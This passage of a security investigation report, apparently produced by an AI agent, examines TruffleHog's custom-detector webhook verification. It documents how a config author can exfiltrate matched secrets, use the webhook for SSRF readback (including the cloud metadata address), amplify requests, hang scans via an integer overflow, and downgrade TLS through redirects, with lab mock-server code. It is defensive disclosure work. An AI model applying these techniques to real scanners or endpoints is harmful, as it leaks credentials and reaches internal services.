github.com/trufflesecurity/trufflehog/v3/pkg/custom_detectors.(*CustomRegexWebhook).FromData(0xc0016041c8, {0x7b52daa8ab98, 0xc003232c60}, 0x0, {0xc001e24a00?, 0x2540be400?, 0x7?})
	<checkout>/pkg/custom_detectors/custom_detectors.go:110 +0x533
github.com/trufflesecurity/trufflehog/v3/pkg/verificationcache.(*VerificationCache).FromData(0xc001d2af80, {0x58f32c0, 0xc003232c60}, {0x58db570, 0xc0016041c8}, 0x0, 0x21?, {0xc001e24a00, 0x1360, 0x3400})
	<checkout>/pkg/verificationcache/verification_cache.go:70 +0x696
github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).detectChunk(0xc001e18680, {0x58f32c0, 0xc00225e900}, {0xc003212540, {{0xc001e24a00, 0x1360, 0x3400}, {0x4eecb7a, 0x17}, 0x1, ...}, ...})
	<checkout>/pkg/engine/engine.go:1070 +0x345
github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).detectorWorker(0xc001e18680, {0x58f32c0, 0xc00225e900})
	<checkout>/pkg/engine/engine.go:1039 +0x150
github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).startDetectorWorkers.func1()
	<checkout>/pkg/engine/engine.go:685 +0xdc
created by github.com/trufflesecurity/trufflehog/v3/pkg/engine.(*Engine).startDetectorWorkers in goroutine 1
	<checkout>/pkg/engine/engine.go:681 +0x10f
	{"detector_worker_id": "5PP5S", "recover": "runtime error: makeslice: len out of range", "error": "panic"}
2026-07-14T21:26:13Z	info-0	trufflehog	sentry flush failed	{"detector_worker_id": "5PP5S"}
2026-07-14T21:26:24Z	error	trufflehog	a detector ignored the context timeout	{"detector_worker_id": "5PP5S", "detector": {"name":"OverflowDet","type":"CustomRegex"}, "timeout": 10}
```

In the `productIndices({0xc002dbc230, 0xa, …})` frame the second argument `0xa` = **10** is `len(lengths)` — the ten named regexes whose per-regex match counts were multiplied; their product overflowed a signed `int` to a negative value, bypassing the `count > maxTotalMatches` clamp and reaching `make([][]int, count)` with a negative length [`pkg/custom_detectors/custom_detectors.go:299`].

Cause→effect: the `make` panic (`makeslice: len out of range`) is caught by `defer common.Recover(ctx)` at the top of `detectChunk` [`engine.go:1049`], so the worker survives — **but** the final, **non-deferred** `data.wgDoneFn()` [`engine.go:1123`] is skipped when the panic unwinds the stack, so the detection `WaitGroup` is never decremented for that chunk and the scan's `Wait()` **blocks forever**. Control run (10 regexes × **50** matches, `50^10` stays positive → capped to 100) completed normally in **2.01 s**, isolating the overflow as the sole cause. A configuration author can thus wedge a scan indefinitely with a purely declarative YAML — no network required.

**Coverage:** verify-once? **No — per permutation** (C1). Something more complex? **Yes — Cartesian product** (C2). Any limit? **Per-span `min(product,100)`, not global** (C1–C3), further **×M verifiers** (C4), dispatched **concurrently, unthrottled** (C5), modulated by a **default-on secret-keyed cache** (C6) and **5 s/10 s** timeouts (C7); plus a **config-DoS overflow hang** (C8).

---

## Q4 — Data sent to the webhook

**User question:** *"When the verification webhook is called, what data gets sent to the endpoint? What information is included in the request?"*

### Direct answer — **[OBSERVED]**
On the **first** verifier, TruffleHog sends an HTTP **`POST`** to the exact configured endpoint path with a **JSON body** `{"<DetectorName>":{"<regexName>":["<submatch>",…]}}` containing **the matched secret** (and, when the regex has a capture group, both the full match and the group). It also sends **each configured header** — but **not verbatim**: the header line is split on the **first** colon, the value is **left-trimmed** of whitespace, and the key is **canonicalized** by Go's `net/http`. A **`User-Agent`** header is added (`TruffleHog` by default, `TruffleHog <suffix>` with `--user-agent-suffix`, or **fully replaced** by a config-supplied `User-Agent` header), plus Go's automatic `Host`, `Content-Length`, and `Accept-Encoding: gzip`. **No `Content-Type` is set** even though the body is JSON. If a detector lists **multiple verifiers**, they are tried **sequentially until one returns exactly HTTP 200**, so a single match can emit **more than one** request. `SuccessRanges` is parsed but **never used** (only `== 200` verifies).

### Mechanism (cause → effect) — **[INFERRED from source, corroborated by the captures below]**
- Body: `json.Marshal(map[string]map[string][]string{ c.GetName(): match })` — `pkg/custom_detectors/custom_detectors.go:L214-L216`. `match` maps each regex name to its `FindAllStringSubmatch` slice, so the secret text (and any capture groups) are included.
- Method/URL: `http.NewRequestWithContext(ctx, "POST", verifyConfig.GetEndpoint(), …)` — `custom_detectors.go:L228`.
- Headers: `key, value, found := strings.Cut(header, ":")` (splits on the **first** colon) then `req.Header.Add(key, strings.TrimLeft(value, "\t\n\v\f\r "))` — `custom_detectors.go:L232-L238`. `Header.Add` canonicalizes the key (`textproto.CanonicalMIMEHeaderKey`) and **appends** duplicates. No `Content-Type` is ever set.
- User-Agent: injected by `CustomTransport.RoundTrip` (`req.Header.Add("User-Agent", UserAgent())`) — `pkg/common/http.go:L99-L102`; `UserAgent()` returns `"TruffleHog"` or `"TruffleHog " + suffix` — `L92-L97`. Because `createResults` adds config headers **before** the transport runs and Go's `Request.write` emits only the **first** `User-Agent` value, a config-supplied `User-Agent` header takes precedence.
- Multiple verifiers: `for _, verifyConfig := range c.GetVerify() { … if resp.StatusCode == http.StatusOK { … break } }` — `custom_detectors.go:L223-L270`. Network error or non-200 falls through to the next verifier (`continue` at `L242`); only exact `200` sets `Verified=true` and `break`s.
- `SuccessRanges`: the field exists (`custom_detectorspb…:L190`, `GetSuccessRanges` `:L246`) and a validator `ValidateVerifyRanges` exists (`validation.go:L55-L97`), but `NewWebhookCustomRegex` never calls it and `createResults` checks only `== http.StatusOK`, so it is a **no-op**.

### Observed output

**Q4.a — basic POST capture (2 runs, byte-identical).** Config header `Authorization: Bearer SUPER-SECRET-ADMIN-HEADER`; target contains `labtok_eee555`.
```
$ /tmp/lab/th filesystem --no-update --config=repro_q4.yaml repro_q4.txt      # run 1 and run 2 identical
✅ Found verified result 🐷🔑
Response: OK
# request captured at the mock (127.0.0.1:18170), one JSON log line, unedited:
{"seq": 1, "method": "POST", "path": "/verify", "ua": "TruffleHog", "auth": "Bearer SUPER-SECRET-ADMIN-HEADER", "content_type": null, "ua_all": ["TruffleHog"], "headers": [["Host", "127.0.0.1:18170"], ["User-Agent", "TruffleHog"], ["Content-Length", "51"], ["Authorization", "Bearer SUPER-SECRET-ADMIN-HEADER"], ["Accept-Encoding", "gzip"]], "body": "{\"LabTokenDetector\":{\"theToken\":[\"labtok_eee555\"]}}"}
```
`content_type` is **null** — no `Content-Type` is sent for the JSON body. The secret is in the body; the attacker-supplied `Authorization` is forwarded.

**Q4.b — capture-group regex** `theToken: 'labtok_([a-z0-9]{6})'` (submatch array carries **both** full match and group; `Raw result` is the group):
```
✅ Found verified result 🐷🔑
Raw result: eee555
# body captured at mock:
"body": "{\"CaptureDetector\":{\"theToken\":[\"labtok_eee555\",\"eee555\"]}}"
```

**Q4.c — headers are NOT verbatim** (config sends `X-Multi-Colon: a:b:c`, `x-lower-key:      spaced-value-with-leading-ws`, and `X-Dup` twice):
```
# headers as received at the mock:
X-Dup: one
X-Dup: two
X-Lower-Key: spaced-value-with-leading-ws
X-Multi-Colon: a:b:c
```
First-colon split keeps `a:b:c` intact as the value; the key `x-lower-key` is canonicalized to `X-Lower-Key`; the leading whitespace is trimmed; duplicate `X-Dup` keys are both appended.

**Q4.d — User-Agent is not fixed.** Default vs `--user-agent-suffix` vs a config-supplied `User-Agent`:
```
default:                       ua_all: ['TruffleHog']
--user-agent-suffix=Recon/9:   ua_all: ['TruffleHog Recon/9']
config header User-Agent:EvilAgent/1.0:  ua_all: ['EvilAgent/1.0']   # config value wins
```

**Q4.e — multiple verifiers tried sequentially until exact 200** (two verifiers; each mock counts its own hits):
```
# verifier#1 returns 500, verifier#2 returns 200:
✅ Found verified result 🐷🔑 ; Response: OK
first(500) mock requests = 1 ; second(200) mock requests = 1     # => 2 requests for ONE match
# both verifiers return 500:
Found unverified result 🐷🔑❓
first mock requests = 1 ; second mock requests = 1               # both tried, still 2 requests
```

**Q4.f — `SuccessRanges` is a no-op** (config `successRanges: ["200-299"]`, endpoint returns 204):
```
# endpoint returns 204 (inside the configured 200-299 range):
Found unverified result 🐷🔑❓        # NOT verified — only ==200 verifies
# control: same config, endpoint returns 200:
✅ Found verified result 🐷🔑
```

> **[INFERRED]** `Host` and `Content-Length` are set by the Go transport, not the config; a body-read error after a 200 leaves `Verified=true` already set (`custom_detectors.go:L251-L256`); and a configured `User-Agent` overrides the injected one because Go writes only the first `User-Agent` value. The header/verifier mechanics above are read from source and corroborated by the captures.

### Reproduction
1. Start the plaintext mock (Appendix) on a loopback port; write a detector config whose `verify` block has the endpoint plus the headers under test.
2. Put the keyword + a matching token in a target file.
3. `trufflehog filesystem --no-update --config=<cfg> <target>`; inspect the mock's single JSON log line for method/path/headers/body. For multiple verifiers, start one mock per endpoint and compare hit counts.

---

## Q5 — ReDoS / regex safety

**User question:** *"How does TruffleHog handle a complex/custom regex pattern? Are there safeguards around regex execution?"*

**Direct answer.** Custom detector patterns are compiled and executed with **Go's standard-library `regexp` package** [`import "regexp"`, `pkg/custom_detectors/custom_detectors.go:9`], whose engine uses **RE2 *syntax* and RE2's linear-time matching guarantee — no backtracking and no backreferences**. (It is Go's own pure-Go implementation of those principles, **not** a separately linked C++ RE2 library.) Because matching is a finite-automaton walk with time **linear in the input length**, there is **no pattern shape that can trigger catastrophic backtracking**, so the classic ReDoS class does not apply to this path. This is confirmed two ways below. The safety derives from the **engine**, not from the detection timeout or `MaxSecretSize` (those bound the *input*, and the context does not interrupt a running synchronous match — see the note).

### Condition A — an "evil" pattern stays flat as input grows [OBSERVED]

Pattern `(a+)+$` (the textbook catastrophic-backtracking pattern) run against a target of N `a`s followed by a non-matching `X` (which defeats `$` and maximizes backtracking pressure). `--scan-entire-chunk` forces the whole (<10 KB, single-chunk) file into one span so the regex provably processes all N `a`s. A **benign** pattern `zzzzzzzz` is run on the **identical** input to isolate the process/scan startup floor.

Target generation: `python3 -c "open('t_N.txt','w').write('a'*N + 'X\n')"`. Command: `/tmp/lab/th filesystem --no-update --no-verification --scan-entire-chunk --config=<evil|benign>.yaml t_N.txt`. Two runs each:

```
N(a's)   evil_wall(s)   benign_wall(s)   evil-benign
1000 r1  2.009          2.009            0.000
1000 r2  1.909          2.010           -0.101
2000 r1  1.909          2.009           -0.100
2000 r2  2.009          1.808            0.201
4000 r1  1.908          1.908            0.000
4000 r2  2.009          1.909            0.100
8000 r1  2.009          1.909            0.100
8000 r2  2.009          2.011           -0.002
```

Cause→effect: the evil-pattern wall time is **flat (~1.9–2.0 s) across an 8× input increase** and is **indistinguishable from the benign control** (`evil − benign ≈ 0`, within ±0.2 s scheduling noise). The ~1.9–2.0 s is fixed process/scan startup, so regex execution cost is negligible. A backtracking engine would exhaust minutes-to-eternity on `(a+)+$` at only a few dozen `a`s; TruffleHog processes **8000** `a`s in the same time as a trivial pattern — the signature of RE2 linear-time matching. **End-to-end vs isolated:** these are end-to-end scan times; the benign-control subtraction isolates the regex contribution to ≈ 0.

### Condition B — a backreference is rejected at config load [OBSERVED]

RE2 does not support backreferences; Go's `regexp.Compile` therefore rejects them, and `ValidateRegex` compiles every pattern at load time [`pkg/custom_detectors/validation.go:23-33`].

```
$ /tmp/lab/th filesystem --no-update --no-verification --config=backref.yaml bt.txt   # regex: '(a)\1'
exit_code=1
error  trufflehog  error parsing the provided configuration file  {"error": "regex 'backref': error parsing regexp: invalid escape sequence: `\\1`"}
```

Control: a valid pattern `(a)a` loads and scans normally (`exit_code=0`, no error). Cause→effect: the backreference `\1` is an *invalid escape* to RE2, so the config is rejected before any scanning — a direct, observable hallmark that the engine is RE2-class (no backreferences), reinforcing the linear-time guarantee.

### Where and how the regex runs (mechanism + citations)

- Each named pattern is compiled with `regexp.Compile` [`custom_detectors.go:92`] and executed with `FindAllStringSubmatch` [`custom_detectors.go:97`] against the **span** passed to `FromData` — **not** the whole file. The default span is bounded by `MaxSecretSize()=1000` (+ keyword radius 512) [`custom_detectors.go:180-182`; `pkg/engine/ahocorasick/ahocorasickcore.go:80-113`]; `--scan-entire-chunk` widens the span to the whole chunk (≤ `ChunkSize` 10240).
- Patterns are validated (compiled) at load time [`validation.go:23-33`], so a malformed/unsupported pattern fails fast (Condition B).

**Correcting the "safeguards."** The detection **timeout is not a regex-execution safeguard**: the 10 s per-span context is checked only via `common.IsDone(ctx)` **before** dispatch/verification [`custom_detectors.go:185,224`], never mid-match, so it cannot interrupt a synchronous `FindAllStringSubmatch` in progress. This is corroborated by the watchdog message `"a detector ignored the context timeout"` observed in the Q3/C3 evidence — the context timeout only *logs*, it does not preempt the running goroutine [`pkg/engine/engine.go:1067`] [INFERRED for a slow-regex case (RE2 cannot be made slow) + CORROBORATED by the observed watchdog]. Likewise `MaxSecretSize` bounds the **input length**, it is not a backtracking guard. The actual protection is the **RE2 linear-time engine**.

**Scope.** "ReDoS" here means **catastrophic regex backtracking**, which RE2 structurally eliminates (Conditions A, B). This is distinct from the *permutation-count* config-DoS documented under Q3/C3 (which is a `productIndices` integer-overflow hang, unrelated to regex matching time).

**Coverage:** How are custom regexes handled? **Compiled+executed by Go stdlib `regexp` (RE2, linear-time)** on the span. Safeguards around execution? **The engine itself (no backtracking, no backreferences)** — validated at load (B), demonstrated linear at runtime (A); the timeout/`MaxSecretSize` bound input but do not guard matching.

---

## Q6 — Overall threat model

**User question:** *"Could someone with control over a detector configuration abuse the verification system in unanticipated ways?"*

### Verdict — synthesis of Q1–Q5 **[OBSERVED except where a clause is tagged INFERRED]**
**Yes — substantially, and in several dimensions without any bound.** The relevant threat actor is a party who authors or controls a custom-detector YAML passed to `--config`. This is a realistic trust boundary: in the motivating scenario, teams contribute detector configurations, and that YAML is untrusted input parsed by `protoyaml.UnmarshalStrict` [`pkg/config/config.go:L27-L36`] into a verifier that then executes on the scanning host. The verification subsystem treats every field of that config — endpoint, headers, regexes, and the verifier list — as fully trusted, with no destination, volume, or overflow guard.

**What the config author CAN do (all OBSERVED):**

1. **Exfiltrate secrets and arbitrary headers (Q4).** Every matched secret value is `POST`ed as a JSON body to the configuration-controlled endpoint, together with any attacker-chosen static headers (normalized, not verbatim). There is no `Content-Type`. This is a direct data-exfiltration channel to an attacker endpoint the moment any secret matches.
2. **Use TruffleHog as an SSRF proxy with readback (Q1).** There is no destination validation, so loopback, RFC1918 private, link-local, and the exact `169.254.169.254` endpoint are all dispatched to; a mixed-case scheme (`HTTP://`) even bypasses the `unsafe` gate. On an **exact HTTP 200** the first **200 bytes** of the response are echoed into `ExtraData["response"]`, i.e. a **semi-in-band SSRF read** primitive. *Prerequisites for the readback:* the internal endpoint must return exactly `200` and the result must actually be emitted (a cache miss — see Q3/C6). *Bound:* because the request is a fixed `POST`, it will **not** lift credentials from a modern **IMDSv2** endpoint (which requires a `PUT`-token then a `GET`); against IMDSv1 or any internal service that answers `200`, the read works. **[bound clause: INFERRED from AWS IMDS docs + OBSERVED POST-only dispatch]**
3. **Trigger high-volume, unthrottled outbound bursts (Q3).** Up to **100 concurrent requests per span** (no `errgroup` limit, no throttle), and because the 100 cap is **per span** and a file has many spans across chunks, a single file drove **200** and **470** requests in the lab; multiple verifiers multiply this further (**×M**). This is an internal port-scan / request-amplification primitive against a chosen destination.
4. **Wedge the scan indefinitely with a declarative config (Q3/C6→C8).** A config with enough named regexes and in-span matches overflows the signed-64-bit permutation count in `productIndices`, bypassing the cap and panicking in `make`; the panic is recovered but the non-deferred `wgDoneFn()` is skipped, so the detection `WaitGroup` never completes and the scan **hangs forever**. No network is required — a pure config-DoS of the scanning pipeline itself.

**What the config author CANNOT (easily) do (OBSERVED):**

5. **MITM the TLS on the direct hop (Q2).** System-CA chain **and** hostname/SAN verification are on by default and **cannot be disabled from a webhook config** (`unsafe` doesn't touch TLS; the codebase's only `InsecureSkipVerify` path, `WithInsecureTLS`, is wired to the Jenkins *source* connector, never to webhooks). A self-signed or wrong-host certificate is rejected **before any request is sent**. **Two caveats shift this:** (a) there is **no certificate pinning**, so any CA the host already trusts — including an installed corporate/MITM interception root — is accepted; and (b) a config author can point the endpoint at an HTTPS server that answers **`307`/`308` with a `Location: http://…` on the same host**, causing the secret (and `Authorization` header) to be **re-sent over cleartext** — a downgrade the actor controls.
6. **Trigger ReDoS (Q5).** Custom patterns run on Go's stdlib `regexp` (RE2 linear-time), which structurally prevents catastrophic backtracking; backreferences are rejected at config load. (This is distinct from the permutation-count config-DoS in item 4, which *is* exploitable.)

**Trust boundary and root cause.** The design implicitly assumes the detector-config author is trusted, and the motivating scenario — teams contributing configs — violates exactly that assumption. Every abuse above (1–4) stems from the same root: untrusted config fields are honored by the verification path with no destination allowlist, no request budget/throttle, no overflow guard, and a response-readback that turns dispatch into a read primitive.

**Mitigations (prose only — NOT implemented; this is a read-only investigation) [INFERRED, benchmarked against external guidance; non-exhaustive].**
- *SSRF (Q1):* resolve the endpoint host to its IP and reject reserved ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`) **before** dispatch; prefer an allowlist to a denylist; canonicalize the scheme (case-insensitive); re-resolve and re-validate on every redirect hop, or disable redirect-following for verification. (OWASP SSRF Prevention Cheat Sheet.)
- *Readback (Q1):* do not echo verification response bodies into scan output, or gate the echo behind a destination allowlist.
- *Volume (Q3):* impose a global per-detector/per-scan request budget, an `errgroup` concurrency limit, and an inter-request throttle.
- *Config-DoS (Q3/C8):* guard the `productIndices` multiplication against overflow (or clamp operands before multiplying), and make `wgDoneFn()` deferred so a recovered panic cannot wedge the `WaitGroup`.
- *TLS downgrade (Q2):* refuse `HTTPS→HTTP` redirects on the verification path; consider certificate pinning for webhook endpoints.
- *Config trust (Q6):* treat detector configs as untrusted input — require review/signing before load, and document the trust assumption. (The feature is **alpha** and subject to change [`README.md:L644`].)

---

## Coverage pass (requirement → condition → command → evidence)

Every distinct sub-question and every named item (including the user's `169.254.169.254`) is enumerated below, with the canonical command that produced the evidence and the in-document section that shows the unedited output. All commands invoke the compiled binary through `trufflehog filesystem --config=<yaml> <target>` (shown as `th`).

| Req | Sub-question / named item | Condition | Canonical command (abridged) | Evidence |
|-----|---------------------------|-----------|------------------------------|----------|
| Q1 | Internal address dispatched? | loopback | `th filesystem --no-update --json --config=q1.yaml t.txt` | Q1.a |
| Q1 | 200 chars vs **bytes**? | multibyte body | same, body = 150×`U+00E9` | Q1.b |
| Q1 | RFC1918 private reached? | `10.236.7.63` | endpoint = private IP | Q1.c |
| Q1 | Validation preventing it? | scheme/empty only | mixed-case `HTTP://` bypass; error contrast | Q1.d, Q1.e |
| Q1 | **`169.254.169.254`** (user example) | config loads; dispatched | `--no-verification` load; fail-closed iptables DROP+REDIRECT+preflight | Q1.f-1, Q1.f-2 |
| Q2 | Cert validation performed? | self-signed | `th … --no-verification-cache …` HTTPS mock, no `SSL_CERT_FILE` | Q2.A |
| Q2 | Valid chain accepted? | trusted CA, correct SAN | `SSL_CERT_FILE=ca.crt`, SAN `IP:127.0.0.1` | Q2.B |
| Q2 | Hostname checked? | trusted CA, wrong SAN | SAN `DNS:wrong.example.com` | Q2.C |
| Q2 | `unsafe` effect on TLS? | `unsafe:false` vs `true` | both configs vs self-signed | Q2.A |
| Q2 | Network-path interception? | `307/308` downgrade | HTTPS→`http://` redirect mock | Q2.D |
| Q3 | Verify once or more? | single regex, N matches | `th … --scan-entire-chunk …`, N∈{5,50,99,100,101,150} | Q3.C1 |
| Q3 | More complex? | two named regexes | product 3×4, 11×10 | Q3.C2 |
| Q3 | Any limit / is 100 global? | per-span cap | multi-span (200) and multi-chunk (470) | Q3.C3 |
| Q3 | Multiple verifiers? | ×M | 3 verifiers all 500 | Q3.C4 |
| Q3 | Throttle / concurrency? | no limit | N=1 vs N=100 wall time | Q3.C5 |
| Q3 | Cache behavior? | default-on / off / collision | `--no-verification-cache` vs default; same secret two detectors | Q3.C6 |
| Q3 | Timeouts? | 5 s vs 10 s | client vs detection context | Q3.C7 |
| Q3 | Config-DoS overflow? | int64 overflow → hang | 10 regexes × 99 matches (**do not re-run**) | Q3.C8 |
| Q4 | Method/path/body? | basic capture | `th … --config=q4.yaml t.txt` | Q4.a |
| Q4 | Capture group in body? | group regex | `theToken: 'labtok_([a-z0-9]{6})'` | Q4.b |
| Q4 | Headers verbatim? | normalization | multi-colon, lower-key, dup keys | Q4.c |
| Q4 | User-Agent fixed? | default/suffix/override | `--user-agent-suffix`; config `User-Agent` header | Q4.d |
| Q4 | Multiple verifiers order? | until exact-200 | 500-then-200; both-500 | Q4.e |
| Q4 | `SuccessRanges` applied? | no-op | `successRanges:["200-299"]`, endpoint 204 | Q4.f |
| Q5 | Regex engine / safeguards? | evil vs benign | `th … --scan-entire-chunk …`, `(a+)+$` vs `zzzzzzzz`, scaled input | Q5.A |
| Q5 | Backreference handling? | RE2 hallmark | `(a)\1` at config load | Q5.C |
| Q6 | Abuse synthesis? | Q1–Q5 combined | (synthesis, no new command) | Q6 |

---

## Appendix — lab harness (for independent reproduction)

All artifacts below lived **outside** the repository checkout, under `/tmp/lab`, and were deleted after the investigation; the source tree was left byte-for-byte unchanged (verified with `git status --porcelain` returning empty). The binary was built outside the checkout with `CGO_ENABLED=0 go build -o /tmp/lab/th .` (Go 1.24.2). Mock servers bind **loopback only** (or, for the RFC1918 test, the container's own private address); ports are parameterized by `CLONE_INDEX` (`PORT_BASE = 18100 + CLONE_INDEX*200`) so parallel agents never collide; each writes a **readiness sentinel** after `bind()`, uses a large listen backlog (`request_queue_size = 1024`) so the harness never masquerades as product behavior, caps request bodies at 1 MiB, and is torn down by an **owned-PID `EXIT`/`INT`/`TERM` trap** (no broad `pkill`).

**`lib.sh`** — shared helpers (owned-PID teardown trap, `CLONE_INDEX` ports, readiness wait):

```bash
#!/usr/bin/env bash
# Shared safe-harness helpers. Mocks bind loopback (or the container's own
# private IP for the RFC1918 test). Every spawned PID is tracked and killed by
# an EXIT trap. Ports are parameterised by CLONE_INDEX. Backgrounded mocks
# redirect stdout/stderr to a file so they never hold a command-substitution
# pipe open.
set -u
LAB=/tmp/lab
TH=/tmp/lab/th
PORT_BASE=$(( 18100 + ( ${CLONE_INDEX:-0} * 200 ) ))
OWNED_PIDS=()

_cleanup() {
  local pid
  for pid in "${OWNED_PIDS[@]:-}"; do
    [ -n "${pid:-}" ] && kill "$pid" 2>/dev/null || true
  done
  for pid in "${OWNED_PIDS[@]:-}"; do
    [ -n "${pid:-}" ] && wait "$pid" 2>/dev/null || true
  done
}
trap _cleanup EXIT INT TERM

wait_ready() {  # wait_ready READYFILE [timeout_s]
  local f="$1" t="${2:-10}" i=0
  while [ ! -s "$f" ]; do
    sleep 0.1; i=$((i+1))
    [ "$i" -ge $((t*10)) ] && { echo "TIMEOUT waiting for $f" >&2; return 1; }
  done
  return 0
}

start_http() {  # start_http HOST PORT LOG READY [STATUS] [BODYLEN] -> prints PID
  local host="$1" port="$2" log="$3" ready="$4" status="${5:-200}" bodylen="${6:-2}"
  : > "$log"; rm -f "$ready"
  python3 "$LAB/mock_http.py" "$host" "$port" "$log" "$ready" "$status" "$bodylen" \
      >"$log.err" 2>&1 </dev/null &
  local pid=$!; OWNED_PIDS+=("$pid")
  wait_ready "$ready" || return 1
  echo "$pid"
}

start_https() {  # start_https HOST PORT LOG READY COUNTER CERT KEY [STATUS] -> prints PID
  local host="$1" port="$2" log="$3" ready="$4" counter="$5" cert="$6" key="$7" status="${8:-200}"
  : > "$log"; rm -f "$ready" "$counter"
  python3 "$LAB/mock_https.py" "$host" "$port" "$log" "$ready" "$counter" "$cert" "$key" "$status" \
      >"$log.err" 2>&1 </dev/null &
  local pid=$!; OWNED_PIDS+=("$pid")
  wait_ready "$ready" || return 1
  echo "$pid"
}

stop_pid() { kill "$1" 2>/dev/null || true; wait "$1" 2>/dev/null || true; }
```

**`mock_http.py`** — threaded plaintext mock (records method/path/headers/body; configurable status + body length):

```python
#!/usr/bin/env python3
"""Safe threaded plaintext HTTP mock for the TruffleHog webhook investigation.

Safety: binds only to the HOST on argv (tests use loopback 127.0.0.1 or the
container's own RFC1918 address); bounded body read (1 MiB) so a large body
cannot exhaust mock memory; atomic counter; one JSON log line per request
(body truncated to 4096 in the log); configurable response status + body
length; large listen backlog; writes a READY sentinel after bind().

Usage: mock_http.py HOST PORT LOG READYFILE [STATUS] [BODYLEN]
"""
import sys, socketserver, http.server, threading, json

HOST = sys.argv[1]
PORT = int(sys.argv[2])
LOG = sys.argv[3]
READYFILE = sys.argv[4]
STATUS = int(sys.argv[5]) if len(sys.argv) > 5 else 200
BODYLEN = int(sys.argv[6]) if len(sys.argv) > 6 else 2

REQ_BODY_CAP = 1 << 20
LOG_BODY_CAP = 4096
RESP = b"OK" if BODYLEN == 2 else (b"X" * BODYLEN)

counter = {"n": 0}
lock = threading.Lock()


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _handle(self):
        length = min(int(self.headers.get("Content-Length", 0) or 0), REQ_BODY_CAP)
        body = self.rfile.read(length) if length else b""
        with lock:
            counter["n"] += 1
            n = counter["n"]
        rec = {
            "seq": n,
            "method": self.command,
            "path": self.path,
            "ua": self.headers.get("User-Agent"),
            "auth": self.headers.get("Authorization"),
            "content_type": self.headers.get("Content-Type"),
            "ua_all": self.headers.get_all("User-Agent"),
            "headers": [[k, v] for k, v in self.headers.items()],
            "body": body[:LOG_BODY_CAP].decode("utf-8", "replace"),
        }
        with open(LOG, "a") as fh:
            fh.write(json.dumps(rec) + "\n")
        self.send_response(STATUS)
        self.send_header("Content-Length", str(len(RESP)))
        self.end_headers()
        self.wfile.write(RESP)

    def do_POST(self): self._handle()
    def do_GET(self): self._handle()
    def do_PUT(self): self._handle()
    def log_message(self, *a): pass


class Srv(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    request_queue_size = 1024
    allow_reuse_address = True


if __name__ == "__main__":
    srv = Srv((HOST, PORT), Handler)
    with open(READYFILE, "w") as fh:
        fh.write("ready %s:%d\n" % (HOST, PORT))
    srv.serve_forever()
```

**`mock_https.py`** — threaded self-signed / configurable-cert HTTPS mock (separately counts app-layer requests vs TLS handshake failures):

```python
#!/usr/bin/env python3
"""Safe threaded self-signed / configurable-cert HTTPS mock (Q2).

Wraps the listening socket in an SSLContext(PROTOCOL_TLS_SERVER) with the
supplied cert/key. get_request() performs the TLS handshake inside a
try/except ssl.SSLError so the server can separately count:
  - app-layer requests that completed a handshake, and
  - handshake FAILURES (e.g. the client rejecting our cert).
Both counters are flushed to COUNTERFILE as JSON on every event. Writes a
READY sentinel after bind(). Binds only to the HOST on argv (loopback).

Usage: mock_https.py HOST PORT LOG READYFILE COUNTERFILE CERT KEY [STATUS]
"""
import sys, ssl, socketserver, http.server, threading, json

HOST = sys.argv[1]
PORT = int(sys.argv[2])
LOG = sys.argv[3]
READYFILE = sys.argv[4]
COUNTERFILE = sys.argv[5]
CERT = sys.argv[6]
KEY = sys.argv[7]
STATUS = int(sys.argv[8]) if len(sys.argv) > 8 else 200

REQ_BODY_CAP = 1 << 20
RESP = b"OK"
counters = {"app_layer": 0, "handshake_errors": 0, "last_error": None}
lock = threading.Lock()


def flush():
    with open(COUNTERFILE, "w") as fh:
        fh.write(json.dumps(counters) + "\n")


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _handle(self):
        length = min(int(self.headers.get("Content-Length", 0) or 0), REQ_BODY_CAP)
        body = self.rfile.read(length) if length else b""
        with lock:
            counters["app_layer"] += 1
            flush()
        with open(LOG, "a") as fh:
            fh.write(json.dumps({"method": self.command, "path": self.path,
                                 "body": body[:4096].decode("utf-8", "replace")}) + "\n")
        self.send_response(STATUS)
        self.send_header("Content-Length", str(len(RESP)))
        self.end_headers()
        self.wfile.write(RESP)

    def do_POST(self): self._handle()
    def do_GET(self): self._handle()
    def log_message(self, *a): pass


class Srv(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    request_queue_size = 1024
    allow_reuse_address = True

    def __init__(self, addr, handler, ctx):
        super().__init__(addr, handler)
        self._ctx = ctx

    def get_request(self):
        sock, addr = self.socket.accept()
        try:
            tls = self._ctx.wrap_socket(sock, server_side=True)
            return tls, addr
        except (ssl.SSLError, OSError) as e:
            with lock:
                counters["handshake_errors"] += 1
                counters["last_error"] = str(e)
                flush()
            try:
                sock.close()
            except OSError:
                pass
            raise


if __name__ == "__main__":
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT, KEY)
    srv = Srv((HOST, PORT), Handler, ctx)
    flush()
    with open(READYFILE, "w") as fh:
        fh.write("ready %s:%d\n" % (HOST, PORT))
    srv.serve_forever()
```

**`fake_imds.py`** — clearly-SYNTHETIC fake metadata endpoint (returns an obviously-fake, >200-byte credential-shaped blob; never proxies to anything real):

```python
#!/usr/bin/env python3
"""Clearly-SYNTHETIC fake IMDS used ONLY inside an isolated network namespace
that has NO route to the real metadata service. Returns an obviously-fake,
>200-byte credential-shaped blob and logs each request. Never contacts and
never proxies to any real endpoint."""
import sys, http.server, socketserver, json
HOST, PORT, LOG, READY = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
FAKE = (b'{"Code":"Success","Type":"AWS-HMAC",'
        b'"AccessKeyId":"FAKE-SYNTHETIC-LAB-ONLY-AKIA0000",'
        b'"SecretAccessKey":"FAKE-SYNTHETIC-LAB-ONLY-DO-NOT-USE-000000000000",'
        b'"Token":"FAKE-SYNTHETIC-SESSION-TOKEN-LAB-ONLY-abcdefghijklmnopqrstuvwxyz",'
        b'"Expiration":"2099-01-01T00:00:00Z"}')  # 286 bytes, all synthetic
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def _h(self):
